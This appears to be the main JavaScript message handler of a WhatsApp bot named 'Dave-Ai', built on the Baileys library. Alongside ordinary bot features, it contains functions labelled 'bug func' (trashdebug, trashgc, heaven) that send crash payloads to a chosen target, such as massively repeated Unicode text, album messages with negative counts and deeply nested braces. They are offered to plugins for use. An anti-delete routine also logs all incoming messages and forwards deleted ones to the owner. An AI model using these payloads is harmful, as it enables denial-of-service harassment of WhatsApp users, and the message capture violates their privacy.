require("./settings")
const { downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia, generateWAMessageFromContent, GroupSettingChange, jidDecode, WAGroupMetadata, emitGroupParticipantsUpdate, emitGroupUpdate, generateMessageID, jidNormalizedUser, generateForwardMessageContent, WAGroupInviteMessageGroupMetadata, GroupMetadata, Headers, delay, WA_DEFAULT_EPHEMERAL, WADefault, getAggregateVotesInPollMessage, generateWAMessageContent, areJidsSameUser, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaconnet, makeInMemoryStore, MediaType, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, initInMemoryKeyStore, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WAMediaUpload, mentionedJid, processTime, Browser, MessageType,
Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, DisconnectReason, WAconnet, getStream, WAProto, isBaileys, AnyMessageContent, templateMessage, InteractiveMessage, Header } = require("@whiskeysockets/baileys")
///package depedencies///////////////
const os = require('os')
const fs = require('fs')
const fg = require('api-dylux')
const fetch = require('node-fetch');
const axios = require('axios')
const { exec, execSync } = require("child_process")
const chalk = require('chalk')
const cheerio = require('cheerio');
const crypto = require('crypto');
const nou = require('node-os-utils')
const moment = require('moment-timezone');
const path = require ('path');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const speed = require('performance-now')
const { Sticker } = require('wa-sticker-formatter');
const { igdl } = require("btch-downloader");
const yts = require ('yt-search');
const { appname,antidel, herokuapi} = require("./set.js");
global.db.data = JSON.parse(fs.readFileSync('./library/database/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}
///////////database access/////////////////
const { addPremiumUser, delPremiumUser } = require("./library/lib/premiun");
/////////exports////////////////////////////////
module.exports = async (dave, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
var msgR = m.message.extendedTextMessage?.contextInfo?.quotedMessage;  
//////////Libraryfunction///////////////////////
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./library/lib/function')
// Main Setting (Admin And Prefix )///////
const budy = (typeof m.text === 'string') ? m.text : '';
        const prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.xprefix
const isCmd = body.startsWith(global.xprefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (dave.user.id.split(':')[0]+'@s.whatsapp.net' || dave.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = dave.user.id.split(':')[0];
const senderNumber = sender.split('@')[0]
const daveshown = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
    const premuser = JSON.parse(fs.readFileSync("./library/database/premium.json"));
const isNumber = x => typeof x === 'number' && !isNaN(x)
const formatJid = num => num.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
const isPremium = daveshown || premuser.map(u => formatJid(u.id)).includes(m.sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const groupMetadata = m.isGroup ? await dave.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
/////////////Setting Console//////////////////
console.log(chalk.black(chalk.bgWhite(!command ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
/////////quoted functions//////////////////
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `𝘿𝙖𝙫𝙚𝘼𝙄`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://files.catbox.moe/yqbio5.jpg' }}}}
let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                   if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                           if (!('welcome' in chats)) chats.welcome = false
        if (!('goodbye' in chats)) chats.goodbye = false
        if (!('warn' in chats)) chats.warn = {}
               } else global.db.data.chats[from] = {
                  antilinkgc: false,
                  antilinkgc: false,
                  welcome: false,
                  goodbye: false,
                  warn: {} 
               }
    if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (daveshown) return m.reply(bvl)
               await dave.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			dave.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (daveshown) return m.reply(bvl)
               await dave.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			dave.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].warn && db.data.chats[m.chat].warn[m.sender]) {
      const warnings = db.data.chats[m.chat].warn[m.sender]

      if (warnings >= setting.warnCount) {
        if (!isBotAdmins || isAdmins || daveshown) return

        await dave.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.sender
          }
        })
      }
    }

const setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
//    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
            if (!('autoread' in setting)) setting.autoread = false
            if (!('online' in setting)) setting.online = true
            if (!('autoTyping' in setting)) setting.autoTyping = false
            if (!('autoRecord' in setting)) setting.autoRecord = false
//        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
//        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
        if (!('onlypc' in setting)) setting.onlygrub = false   
	  } else db.data.settings[botNumber] = {
   	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoTyping: true,
   		auto_ai_grup: false,
   		goodbye: false,
    		onlygrub: false,
            onlypc: false,
            online: false,
       welcome: true, 
    		autoread: false,
    		menuType: 'externalImage' //> buttonImage
	    }



if (!m.key.fromMe && db.data.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await dave.readMessages([readkey]);
}
dave.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
dave.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
dave.sendPresenceUpdate('recording', m.chat)
}
}
if (db.data.settings[botNumber].autobio) {
let setting = db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await dave.updateProfileStatus(`✳️𝘿𝙖𝙫𝙚𝘼𝙄 || Runtime : ${uptime}`)
setting.status = new Date() * 1
}
}
    
    if (!m.isGroup && !daveshown && db.data.settings[botNumber].onlygrub ) {
        	if (command){
            return m.reply(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${global.owner}`)
            }
        }
        // Private Only
        if (!daveshown && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (command){
	         return m.reply("Hello buddy! if you want to use this bot, please chat the bot in private chat")
	     }
	}
    
    ///unavailable and online 
    if (!dave.public) {
            if (daveshown && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
        	if (command) {
        
dave.sendPresenceUpdate('unavailable', from)
        }
        }
    
async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}
const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnailUrl: "https://n.uguu.se/BacqcVGE.jpg",
      itemCount: "999999",
      status: "INQUIRY",
      surface: "CATALOG",
      Runtime : "${runtime(process.uptime())}",
      message: `Sender : @${m.sender.split('@')[0]}\n愛とは何か？ `,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

      

    
const mdmodes = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "13135559098@s.whatsapp.net"
} : {}),
id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `𝘿𝙖𝙫𝙚𝘼𝙄`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
},
status: 1,
  participant: "0@s.whatsapp.net"
}
const qtext = { key: {fromMe: false, participant: `254104260236@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "𝘿𝙖𝙫𝙚𝘼𝙄" }}}

////////////////Reply Message////////////////
const replypic = fs.readFileSync('./library/media/connect.jpg');
const quotedMessage = m.quoted?.message?.extendedTextMessage?.contextInfo?.quotedMessage || m.quoted?.message?.imageMessage || m.quoted?.message?.videoMessage;
async function trashreply(teks) {
dave.sendMessage(m.chat, {
text: teks,
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363400480173280@newsletter",
newsletterName: "𝘿𝙖𝙫𝙚𝘼𝙄" 
}
}
}, {
quoted: qtext
})
}

async function reply(text) {
            dave.sendMessage(m.chat, {
                text: text,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title:"𝘿𝙖𝙫𝙚𝘼𝙄",
                        body:"made by dave",
                        thumbnailUrl: "https://n.uguu.se/BacqcVGE.jpg",
                        sourceUrl: null,
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted:m})
        }
const trashpic = fs.readFileSync('./library/media/porno.jpg');
async function replymenu(teks) {
dave.sendMessage(m.chat, {
image:trashpic,  
caption: teks,
sourceUrl: 'https://github.com/giftdee',    
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363400480173280@newsletter",
newsletterName: "𝘿𝙖𝙫𝙚𝘼𝙄"
}
}
}, {
quoted: fkontak
})
}
 //////////React message///////////////
    const reaction = async (jidss, emoji) => {
    dave.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };
 /////////function set presence/////
                   /*if (global.autoRecording) {
        dave.sendPresenceUpdate('recording', from)
        }      
      if (global.autoTyping) {
        dave.sendPresenceUpdate('composing', from)
        }*/
        if (global.autorecordtype) {
        let trashrecord = ['recording','composing']
        let xeonrecordinfinal = trashrecord[Math.floor(Math.random() * trashrecord.length)]
        dave.sendPresenceUpdate(xeonrecordinfinal, from)

        }
if (m.isGroup) {
    if (body.includes(`@254104260236`)) {
        reaction(m.chat, "❓")
    }
 }
    async function loading () {
var menuload = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
" 𝘿𝙖𝙫𝙚𝘼𝙄..."
]
let { key } = await dave.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < menuload.length; i++) {
await reply( menuload[i],{edit:key })
}
}
    
///////////////Similarity///////////////////////
function getCaseNames() {
  try {
    const data = fs.readFileSync('./dave.js', 'utf8');
    const casePattern = /case\s+'([^']+)'/g;
    const matches = data.match(casePattern);

    if (matches) {
      return matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
    } else {
      return [];
    }
  } catch (error) {
    console.error('error occurred:', error);
    throw error;
  }
}

/////////////fetch commands///////////////
let totalfeature= () =>{
var mytext = fs.readFileSync("./dave.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
        }
////////////tag owner reaction//////////////
if (m.isGroup) {
    if (body.includes(`@${owner}`)) {
        reaction(m.chat, "❌")
    }
 }
/////////////test bot no prefix///////////////
if ((budy.match) && ["bot",].includes(budy) && !isCmd) {
reply(`𝘿𝙖𝙫𝙚𝘼𝙄 is always online ✅`)
}	
///////////example///////////////////////////
////////bug func/////////////////////
 async function trashdebug(target) {
  await dave.sendMessage(target, {
    text:
      "🧪‌⃰Ꮡ‌‌" +
      "ꦾ࣯࣯" +
      "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" +
      "𑇂𑆵𑆴𑆿".repeat(60000),
    contextInfo: {
      externalAdReply: {
        title: ``,
        body: ``,
        previewType: "PHOTO",
        thumbnail: null,
        sourceUrl: ``
      }
    }
  }, { quoted: m });
}
                    
                            
                        
                    

    
            
        
      

///////bug group/////////////////  
    async function trashgc(target) {
const fakeKey = {
    "remoteJid": target,
    "fromMe": true,
    "id": await dave.relayMessage(target, {
        "albumMessage": {
            "expectedImageCount": -99999999,
            "expectedVideoCount": 0,
            "caption": "x"
        }
    },{participant:{jid:target}})
}
let xx = {"url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c&mms3=true","mimetype": "image/jpeg","fileSha256": "yTsEb/zyGK+lB2DApj/PK+gFA1D6Heq/G0DIQ74uh6k=","fileLength": "52039","height": 786,"width": 891,"mediaKey": "XtKW4xJTHhBzWsRkuwvqwQp/7SVayGn6sF6XgNblyLo=","fileEncSha256": "rm/kKkIFGA1Vh6yKeaetbsvCS7Cp2vcGYoiNkrvPCwY=","directPath": "/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c"}
let xz
for (let s = 0; s < 2; s++) {
if (s === 1) {
xx.caption = "𑲱".repeat(200000);
}
const xy = await generateWAMessageFromContent(target, proto.Message.fromObject({
"botInvokeMessage": {
"message": {
    "messageContextInfo": {
        "messageSecret": (0, crypto.randomBytes)(32),
        "messageAssociation": {
            "associationType": "MEDIA_ALBUM",
            "parentMessageKey": fakeKey
        }
    },
"imageMessage": xx
}
}
}),{participant:{jid:target}})
xz = await dave.relayMessage(target, xy.message, {messageId:xy.key.id})
await sleep(100)
}
}
        
  async function heaven(target) {
let msg = await generateWAMessageFromContent(target, {
  interactiveMessage: {
    contextInfo: {
      isForwarded: true, 
      forwardingScore: 1972,
      businessMessageForwardInfo: {
        businessOwnerJid: "13135550002@s.whatsapp.net"
      }
    }, 
    header: {
      jpegThumbnail: null, 
      hasMediaAttachment: true, 
      title: "D | 7eppeli-Exploration"
    }, 
    nativeFlowMessage: {
      buttons: [
        {
          name: "payment_method",
          buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
        }
      ],
      messageParamsJson: "{".repeat(1000) + "}".repeat(1000)
    }, 
  }
}, { userJid:target });
  
  await dave.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}        
              
          
    
    
 
    
              
              
        
   
   ////anti delete//////
const baseDir = 'message_data';
if (!fs.existsSync(baseDir)) {
  fs.mkdirSync(baseDir);
}

function loadChatData(remoteJid, messageId) {
  const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
  try {
    if (!fs.existsSync(chatFilePath)) {
      return [];
    }
    const data = fs.readFileSync(chatFilePath, 'utf8');
    return JSON.parse(data) || [];
  } catch (error) {
    console.error(`Error loading message ${messageId}:`, error.message);
    return [];
  }
}

function saveChatData(remoteJid, messageId, chatData) {
  const chatDir = path.join(baseDir, remoteJid);

  if (!fs.existsSync(chatDir)) {
    fs.mkdirSync(chatDir, { recursive: true });
  }

  const chatFilePath = path.join(chatDir, `${messageId}.json`);

  try {
    fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
  } catch (error) {
    console.error('Error saving chat data:', error);
  }
}

function handleIncomingMessage(message) {
  try {
    const remoteJid = message.key.remoteJid;
    const messageId = message.key.id;

    if (!remoteJid || !messageId) return;

    const chatData = loadChatData(remoteJid, messageId);
    chatData.push(message);
    saveChatData(remoteJid, messageId, chatData);
  } catch (error) {
    console.error('Error in handleIncomingMessage:', error);
  }
}

async function handleMessageRevocation(dave, revocationMessage) {
  try {
    const remoteJid = revocationMessage.key.remoteJid;
    const messageId = revocationMessage.message.protocolMessage.key.id;

    const chatData = loadChatData(remoteJid, messageId);
    
    if (!chatData || chatData.length === 0) {
      console.log('Original message not found');
      return;
    }

    const originalMessage = chatData[0];

    const deletedBy = revocationMessage.participant || revocationMessage.key.participant || revocationMessage.key.remoteJid;
    const sentBy = originalMessage.key.participant || originalMessage.key.remoteJid;

    const deletedByFormatted = `@${deletedBy.split('@')[0]}`;
    const sentByFormatted = `@${sentBy.split('@')[0]}`;

    if (deletedBy.includes(dave.user.id) || sentBy.includes(dave.user.id)) return;

    let notificationText = `𝘿𝙖𝙫𝙚𝘼𝙄-ANTIDELETE🔥\n\n` +
      ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗯𝘆 : ${deletedByFormatted}\n\n`;

    try {
      if (originalMessage.message?.conversation) {
        const messageText = originalMessage.message.conversation;
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : ${messageText}`;
        await dave.sendMessage(dave.user.id, { text: notificationText });
      } 
      else if (originalMessage.message?.extendedTextMessage) {
        const messageText = originalMessage.message.extendedTextMessage.text;
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗖𝗼𝗻𝘁𝗲𝗻𝘁 : ${messageText}`;
        await dave.sendMessage(dave.user.id, { text: notificationText });
      }
      else if (originalMessage.message?.imageMessage) {
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Image]`;
        try {
          const buffer = await dave.downloadMediaMessage(originalMessage);
          await dave.sendMessage(dave.user.id, { 
            image: buffer,
            caption: `${notificationText}\n\nImage caption: ${originalMessage.message.imageMessage.caption || ''}`
          });
        } catch (mediaError) {
          console.error('Failed to download image:', mediaError);
          notificationText += `\n\n⚠️ Could not recover deleted image (media expired)`;
          await dave.sendMessage(dave.user.id, { text: notificationText });
        }
      } 
      else if (originalMessage.message?.videoMessage) {
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Video]`;
        try {
          const buffer = await dave.downloadMediaMessage(originalMessage);
          await dave.sendMessage(dave.user.id, { 
            video: buffer, 
            caption: `${notificationText}\n\nVideo caption: ${originalMessage.message.videoMessage.caption || ''}`
          });
        } catch (mediaError) {
          console.error('Failed to download video:', mediaError);
          notificationText += `\n\n⚠️ Could not recover deleted video (media expired)`;
          await dave.sendMessage(dave.user.id, { text: notificationText });
        }
      } 
      else if (originalMessage.message?.stickerMessage) {
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Sticker]`;
        const buffer = await dave.downloadMediaMessage(originalMessage);      
        await dave.sendMessage(dave.user.id, { 
          sticker: buffer, 
          contextInfo: {
            externalAdReply: {
              title: notificationText,
              body: `DELETED BY : ${deletedByFormatted}`,
              thumbnail: trashpic,
              sourceUrl: '',
              mediaType: 1,
              renderLargerThumbnail: false
            }
          }
        });
      } 
      else if (originalMessage.message?.documentMessage) {
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Document]`;
        const docMessage = originalMessage.message.documentMessage;
        const fileName = docMessage.fileName || `document_${Date.now()}.dat`;
        console.log('Attempting to download document...');
        const buffer = await dave.downloadMediaMessage(originalMessage);
        
        if (!buffer) {
          console.log('Download failed - empty buffer');
          notificationText += ' (Download Failed)';
          await dave.sendMessage(dave.user.id, { text: notificationText });
          return;
        }
        
        console.log('Sending document back...');
        await dave.sendMessage(dave.user.id, { 
          document: buffer, 
          fileName: fileName,
          mimetype: docMessage.mimetype || 'application/octet-stream',
          contextInfo: {
            externalAdReply: {
              title: notificationText,
              body: `DELETED BY: \n\n ${deletedByFormatted}`,
              thumbnail: trashpic,
              sourceUrl: '',
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        });
      } 
      else if (originalMessage.message?.audioMessage) {
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮: \n\n [Audio]`;
        const buffer = await dave.downloadMediaMessage(originalMessage);
        const isPTT = originalMessage.message.audioMessage.ptt === true;
        await dave.sendMessage(dave.user.id, { 
          audio: buffer, 
          ptt: isPTT, 
          mimetype: 'audio/mpeg', 
          contextInfo: {
            externalAdReply: {
              title: notificationText,
              body: `DELETED BY: \n\n ${deletedByFormatted}`,
              thumbnail: trashpic,
              sourceUrl: '',
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        });
      }	      
    } catch (error) {
      console.error('Error handling deleted message:', error);
      notificationText += `\n\n⚠️ Error recovering deleted content 😓`;
      await dave.sendMessage(dave.user.id, { text: notificationText });
    }
  } catch (error) {
    console.error('Error in handleMessageRevocation:', error);
  }
}

 if (antidel === "TRUE") {
        if (m.message?.protocolMessage?.key) {
          await handleMessageRevocation(dave, m);
        } else {
          handleIncomingMessage(m);
        }
	  }                   
                        
                
                    

            
                
    


        
                        
                

            

            

    
///////////end bug func///////////
const example = (teks) => {
return `\n *invalid format!*\n`
}
const menu = require('./library/listmenu/menulist');
/////////////plugins commands/////////////
const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}
//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "daveplugins"))
const trashdex = { daveshown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,dave,m,q,mime,sleep,fkontak,addPremiumUser, args,delPremiumUser,isPremium,trashpic,trashdebug,sleep,isAdmins,groupAdmins,isBotAdmins,quoted,from,groupMetadata,downloadAndSaveMediaMessage,heaven,menu,loading,quotedMessage}
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, trashdex)
}
}
if (!pluginsDisable) return
switch (command) {
case 'script':
case 'repo': {
  const botInfo = `
╭─ ⌬ Bot Info
│ • Name    : ${botname}
│ • Owner   : ${ownername}
│ • Version  : ${botversion}
│ • Repo : gitHub.com/giftdedavesmd/Dave-Ai/fork 
│ • Runtime  : ${runtime(process.uptime())}\n╰─────────────
`
  reply(botInfo)
}
break
//==================================================//     
        case "update": case "redeploy": {
		      const axios = require('axios');

		if(!daveshown) return reply(mess.owner);
		     if (!appname || !herokuapi) {
            await reply("It looks like the Heroku app name or API key is not set. Please make sure you have set the `APP_NAME` and `HEROKU_API` environment variables.");
            return;
        }

        async function redeployApp() {
            try {
                const response = await axios.post(
                    `https://api.heroku.com/apps/${appname}/builds`,
                    {
                        source_blob: {
                            url: "https://github.com/giftdedavesmd/Dave-Ai/tarball/main",
                        },
                    },
                    {
                        headers: {
                            Authorization: `Bearer ${herokuapi}`,
                            Accept: "application/vnd.heroku+json; version=3",
                        },
                    }
                );

                await m.reply("Your bot is undergoing an upgrade, hold  for the next 2 minutes as the redeploy executes! Once done, you’ll have the freshest version of *Dave-Ai* .");
                console.log("Build details:", response.data);
            } catch (error) {
                const errorMessage = error.response?.data || error.message;
                await reply(`Failed to update and redeploy. Please check if you have set the Heroku API key and Heroku app name correctly.`);
